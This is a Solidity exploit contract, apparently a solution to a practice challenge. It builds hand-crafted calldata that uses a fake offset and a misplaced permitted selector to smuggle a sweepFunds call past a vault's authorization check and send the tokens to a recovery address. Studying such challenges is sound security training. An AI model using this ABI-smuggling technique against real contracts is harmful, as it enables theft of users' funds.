// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface ISelfAuthorizedVault {
    function execute(
        address target,
        bytes memory actionData
    ) external returns (bytes memory);
}

contract testSelfAuthorizedVault {
    address recover;
    address SelfAuthorizedVault;
    address token;

    constructor(
        address _token,
        address _SelfAuthorizedVault,
        address _recover
    ) {
        token = _token;
        SelfAuthorizedVault = _SelfAuthorizedVault;
        recover = _recover;
    }

    function start() external view returns (bytes memory) {
        bytes memory data = abi.encodeWithSignature(
            "sweepFunds(address,address)",
            recover,
            token
        );
        {
            bytes memory normalData = abi.encodeWithSignature(
                "execute(address,bytes)",
                SelfAuthorizedVault,
                data
            );

            console.logBytes(normalData);
        }
        bytes memory executeData = abi.encodePacked(
            bytes4(0x1cff79cd),
            uint256(uint160(SelfAuthorizedVault)),
            uint256(32 * 4), //offset
            uint256(0), //fake length
            uint256(0xd9caed12 << 224),
            uint256(data.length),
            data,
            uint224(0) //pad
        );

        console.logBytes((executeData));
        // (bool suc, bytes memory ret) = SelfAuthorizedVault.call(executeData);
        // console.log(suc);

        // console.logBytes((ret));
        return executeData;
    }

    function end() external {}

    function printTokenBalance(
        address _token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = _token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    fallback() external payable {}

    receive() external payable {}
}
